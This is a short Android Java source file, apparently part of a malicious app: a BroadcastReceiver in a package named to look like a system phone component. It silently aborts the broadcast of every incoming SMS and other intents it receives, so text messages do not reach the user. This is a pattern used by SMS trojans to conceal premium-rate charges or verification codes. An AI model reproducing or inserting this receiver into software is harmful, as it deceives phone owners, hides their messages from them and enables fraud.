package org.android.phone;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class SMSStateReceiver extends BroadcastReceiver {

	public void onReceive(Context context, Intent intent) {
		String MSG_TYPE = intent.getAction();

		if (MSG_TYPE.equals("android.provider.Telephony.SMS_RECEIVED")) {
			abortBroadcast();

		} else if (MSG_TYPE.equals("android.provider.Telephony.SEND_SMS")) {
			abortBroadcast();
		} else {
			abortBroadcast();
		}

	}

}